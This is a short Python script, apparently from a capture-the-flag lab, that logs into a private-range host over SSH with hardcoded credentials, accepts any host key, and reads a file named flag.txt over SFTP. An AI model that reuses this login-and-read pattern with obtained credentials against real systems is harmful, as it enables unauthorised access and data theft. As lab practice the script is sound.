import paramiko
import sys
import os

target = '10.10.162.142'
username = 'tiffany'
password = 'trustno1'

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(target, port=22, username=username, password=password)

sftp = ssh.open_sftp()

flag = sftp.open('flag.txt', 'r')

print(flag.read())
